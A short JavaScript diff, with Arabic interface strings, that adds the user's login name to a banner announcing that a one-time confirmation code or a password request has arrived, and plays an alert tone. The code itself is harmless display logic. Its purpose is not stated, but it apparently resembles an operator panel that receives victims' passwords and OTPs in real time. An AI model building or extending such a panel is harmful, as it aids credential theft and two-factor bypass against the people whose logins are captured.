@@ -339,7 +339,10 @@ function playPendingTone(){
 function showPendingAlert(s){
   const banner = document.getElementById('pendingAlert');
   if (!banner) return;
-  const label = s && s.status === 'pending_otp' ? '🔔 تم وصول رمز التأكيد' : '🔔 تم وصول طلب كلمة المرور';
+  const user = (s && s.login) ? String(s.login).trim() : 'مستخدم';
+  const label = s && s.status === 'pending_otp'
+    ? `🔔 تم وصول رمز التأكيد للـ ${user}`
+    : `🔔 تم وصول طلب كلمة المرور للـ ${user}`;
   banner.textContent = label;
   banner.classList.add('show');
   playPendingTone();
